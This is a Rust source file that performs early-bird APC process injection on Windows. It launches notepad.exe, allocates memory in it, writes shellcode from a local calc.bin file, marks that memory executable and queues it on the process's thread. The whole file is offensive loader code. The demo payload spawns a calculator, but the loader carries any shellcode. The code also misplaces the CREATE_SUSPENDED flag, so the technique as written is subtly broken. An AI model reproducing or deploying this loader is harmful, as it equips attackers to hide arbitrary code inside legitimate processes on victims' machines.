use {
    std::{
        ptr::{null_mut, null},
        mem::{zeroed},
        intrinsics::transmute,
    },
    windows_sys::Win32::{
        Foundation::{FALSE, TRUE},
        System::{
            Memory::{VirtualAllocEx, VirtualProtectEx, MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, PAGE_EXECUTE},
            Diagnostics::Debug::{WriteProcessMemory},
            Threading::{CreateProcessA, CREATE_SUSPENDED, PROCESS_INFORMATION, STARTF_USESTDHANDLES, STARTUPINFOA, CREATE_NO_WINDOW, QueueUserAPC},
        },
    },
};

fn main() {
    let calc_shellcode = include_bytes!(r#"C:\Users\user\Desktop\calc.bin"#); // Shellcode to spawn calculator
    let notepad_location = b"C:\\Windows\\System32\\notepad.exe\0";

    unsafe { // unsafe as the compiler cannot guarantee the memory safety.
        let mut pi: PROCESS_INFORMATION = zeroed();
        let mut si: STARTUPINFOA = zeroed();
        si.dwFlags = STARTF_USESTDHANDLES | CREATE_SUSPENDED;
        si.wShowWindow = 0;

        let create_proc = CreateProcessA( // creates the process
                                          notepad_location.as_ptr(),
                                          null_mut(),
                                          null(),
                                          null(),
                                          TRUE,
                                          CREATE_NO_WINDOW,
                                          null(),
                                          null(),
                                          &si,
                                          &mut pi,
        );
        if create_proc == FALSE {
            println!("failed to create process");
            return;
        }

        let allocate_mem = VirtualAllocEx( // allocates the memory that we will later write the shellcode to.
                                           pi.hProcess,
                                           null(),
                                           calc_shellcode.len(),
                                           MEM_COMMIT | MEM_RESERVE,
                                           PAGE_READWRITE,
        );
        if allocate_mem.is_null() {
            println!("failed to allocate memory");
            return;
        }

        let write_shell = WriteProcessMemory( // write the shellcode to the allocated memory
                                              pi.hProcess,
                                              allocate_mem,
                                              calc_shellcode.as_ptr().cast(),
                                              calc_shellcode.len(),
                                              null_mut(),
        );
        if write_shell == FALSE {
            println!("failed to write shellcode");
            return;
        }

        let mut old = PAGE_READWRITE;
        let res = VirtualProtectEx(pi.hProcess, allocate_mem, calc_shellcode.len(), PAGE_EXECUTE, &mut old); // makes the shellcode executable
        if res == FALSE {
            println!("failed to make shellcode executable");
            return;
        }

        let func = transmute(allocate_mem); // transmutes the shellcode to a function pointer
        let res = QueueUserAPC(Some(func), pi.hThread, 0); // queues the user APC
        if res == 0 {
            println!("failed to queue user APC");
            return;
        }
    }
}